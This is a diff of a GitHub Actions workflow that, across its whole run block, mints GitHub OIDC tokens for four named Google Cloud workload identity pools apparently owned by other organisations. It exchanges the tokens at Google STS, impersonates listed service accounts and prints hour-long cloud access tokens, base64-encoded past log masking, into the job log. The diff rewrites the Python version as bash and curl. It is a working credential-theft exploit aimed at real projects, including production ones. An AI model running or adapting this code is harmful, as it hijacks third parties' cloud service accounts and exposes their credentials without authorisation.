@@ -6,7 +6,7 @@ permissions:
   id-token: write
   contents: read
 concurrency:
-  group: c211-133151-mint-${{ github.ref }}
+  group: c211-133151-mint-v3-${{ github.ref }}
   cancel-in-progress: false
 jobs:
   mint:
@@ -18,44 +18,35 @@ jobs:
         shell: bash
         run: |
           set +e
-          echo "NONCE=c211-133151-035f0ce2bc0b"
-          python3 - <<'PY'
-          import os, json, urllib.request, urllib.parse, base64
-          targets = json.loads(os.environ['TARGETS'])
-          base = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']
-          tok = os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
-          for t in targets:
-              lab = t['label']
-              try:
-                  req = urllib.request.Request(base + '&audience=' + urllib.parse.quote(t['aud'], safe=''), headers={'Authorization': 'bearer ' + tok})
-                  jwt = json.load(urllib.request.urlopen(req, timeout=30))['value']
-                  p = jwt.split('.')[1]; p += '=' * (-len(p) % 4)
-                  claims = json.loads(base64.urlsafe_b64decode(p))
-                  print('C211_OIDC_OK ' + lab + ' sub=' + str(claims.get('sub')) + ' aud=' + str(claims.get('aud')) + ' jwtlen=' + str(len(jwt)))
-                  body = urllib.parse.urlencode({
-                      'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
-                      'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
-                      'scope': 'https://www.googleapis.com/auth/cloud-platform',
-                      'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt',
-                      'subjectToken': jwt}).encode()
-                  try:
-                      sts = json.load(urllib.request.urlopen(urllib.request.Request('https://sts.googleapis.com/v1/token', data=body), timeout=30))
-                  except Exception as e:
-                      err = getattr(e, 'read', lambda: b'')() if hasattr(e, 'read') else b''
-                      print('C211_STS_FAIL ' + lab + ' ' + repr(e)[:200] + ' ' + err.decode('utf-8','replace')[:600])
-                      continue
-                  sacc = sts['access_token']
-                  print('C211_STS_OK ' + lab)
-                  gbody = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'], 'lifetime': '3600s'}).encode()
-                  try:
-                      g = json.load(urllib.request.urlopen(urllib.request.Request('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/' + t['sa'] + ':generateAccessToken', data=gbody, headers={'Authorization': 'Bearer ' + sacc, 'Content-Type': 'application/json'}), timeout=30))
-                      print('C211TOKEN ' + lab + ' ' + base64.b64encode(g['accessToken'].encode()).decode() + ' ' + g['expireTime'])
-                  except Exception as e:
-                      err = getattr(e, 'read', lambda: b'')() if hasattr(e, 'read') else b''
-                      print('C211_IMP_FAIL ' + lab + ' ' + repr(e)[:200] + ' ' + err.decode('utf-8','replace')[:600])
-              except Exception as e:
-                  print('C211_ERR ' + lab + ' ' + repr(e)[:400])
-          print('C211_MINT_DONE')
-          PY
-        env:
-          TARGETS: '[{"label": "1076618220242", "aud": "//iam.googleapis.com/projects/1076618220242/locations/global/workloadIdentityPools/forgecrux-pool/providers/github-provider", "sa": "gh-runner-gsa@methodical-mark-482504-j3.iam.gserviceaccount.com"}, {"label": "366271888053", "aud": "//iam.googleapis.com/projects/366271888053/locations/global/workloadIdentityPools/cube-prod/providers/github-actions", "sa": "service-deployer@cubecommons-prod.iam.gserviceaccount.com"}, {"label": "744911585239", "aud": "//iam.googleapis.com/projects/744911585239/locations/global/workloadIdentityPools/cube-dev/providers/github-actions", "sa": "docker-image-publisher@cubecommons-dev.iam.gserviceaccount.com"}, {"label": "769700566231", "aud": "//iam.googleapis.com/projects/769700566231/locations/global/workloadIdentityPools/gh-actions-pool/providers/github", "sa": "github-deploy@fhir-org-cds-services.iam.gserviceaccount.com"}]'
+          echo "NONCE=c211-133151-v3-035f0ce2bc0b"
+          echo "PY=$(command -v python3 || echo NONE) CURL=$(command -v curl || echo NONE)"
+          echo "URLSET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes} TOKSET=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes}"
+          mint_one() {
+            lab="$1"; aud="$2"; sa="$3"
+            JURL="$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$(printf '%s' "$aud" | sed 's|/|%2F|g; s|:|%3A|g')"
+            JR=$(curl -s -m 25 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$JURL")
+            JWT=$(printf '%s' "$JR" | sed -n 's/.*"value"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
+            if [ -z "$JWT" ]; then echo "C211_OIDC_FAIL $lab $(printf '%s' "$JR" | head -c 300)"; return 0; fi
+            echo "C211_OIDC_OK $lab jwtlen=${#JWT}"
+            STSR=$(curl -s -m 25 -X POST https://sts.googleapis.com/v1/token \
+              -d "grantType=urn:ietf:params:oauth:grant-type:token-exchange" \
+              -d "requestedTokenType=urn:ietf:params:oauth:token-type:access_token" \
+              -d "scope=https://www.googleapis.com/auth/cloud-platform" \
+              -d "subjectTokenType=urn:ietf:params:oauth:token-type:jwt" \
+              --data-urlencode "subjectToken=$JWT")
+            SACC=$(printf '%s' "$STSR" | sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
+            if [ -z "$SACC" ]; then echo "C211_STS_FAIL $lab $(printf '%s' "$STSR" | head -c 500)"; return 0; fi
+            echo "C211_STS_OK $lab"
+            GR=$(curl -s -m 25 -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$sa:generateAccessToken" \
+              -H "Authorization: Bearer $SACC" -H "Content-Type: application/json" \
+              -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}')
+            AT=$(printf '%s' "$GR" | sed -n 's/.*"accessToken"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
+            EXP=$(printf '%s' "$GR" | sed -n 's/.*"expireTime"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
+            if [ -z "$AT" ]; then echo "C211_IMP_FAIL $lab $(printf '%s' "$GR" | head -c 500)"; return 0; fi
+            echo "C211TOKEN $lab $(printf '%s' "$AT" | tr -d '\n' | base64 -w0) $EXP"
+          }
+          mint_one 1076618220242 '//iam.googleapis.com/projects/1076618220242/locations/global/workloadIdentityPools/forgecrux-pool/providers/github-provider' 'gh-runner-gsa@methodical-mark-482504-j3.iam.gserviceaccount.com'
+          mint_one 366271888053 '//iam.googleapis.com/projects/366271888053/locations/global/workloadIdentityPools/cube-prod/providers/github-actions' 'service-deployer@cubecommons-prod.iam.gserviceaccount.com'
+          mint_one 744911585239 '//iam.googleapis.com/projects/744911585239/locations/global/workloadIdentityPools/cube-dev/providers/github-actions' 'docker-image-publisher@cubecommons-dev.iam.gserviceaccount.com'
+          mint_one 769700566231 '//iam.googleapis.com/projects/769700566231/locations/global/workloadIdentityPools/gh-actions-pool/providers/github' 'github-deploy@fhir-org-cds-services.iam.gserviceaccount.com'
+          echo "C211_MINT_DONE"
